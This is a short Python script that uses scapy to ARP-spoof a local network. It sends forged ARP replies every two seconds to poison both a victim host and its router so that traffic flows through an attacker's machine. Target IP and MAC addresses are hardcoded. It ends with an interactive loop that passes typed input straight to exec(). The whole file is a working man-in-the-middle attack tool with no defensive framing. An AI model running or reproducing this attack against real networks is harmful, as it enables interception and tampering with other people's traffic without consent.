from os import system
from scapy.all import *
from time import sleep
from threading import Thread


router_ip = "192.168.1.1"        # Router IP
router_mac = "0c:b9:37:86:7b:7b" # Router MAC
attacker_mac = "CC:47:40:F6:21:E6" # Attacker MAC

victim_ip = "192.168.1.10"      # Victim IP
victim_mac = "b8:81:98:87:11:99" # Victim MAC

# Craft ARP reply to victim: "Router is at Attacker_MAC"
arp_to_victim = ARP(op=2, psrc=router_ip, hwsrc=attacker_mac, pdst=victim_ip, hwdst=victim_mac)
# Craft ARP reply to router: "Victim is at Attacker_MAC"
arp_to_router = ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=router_ip, hwdst=router_mac)


def spoof():
    while True:
        print("[*] Starting ARP spoof...")
        send(arp_to_victim, verbose=False)
        send(arp_to_router, verbose=False)
        sleep(2)


if __name__ == "__main__":
    Thread(target=spoof, daemon=True).start()
    while True:
        exec(input(">>> "))
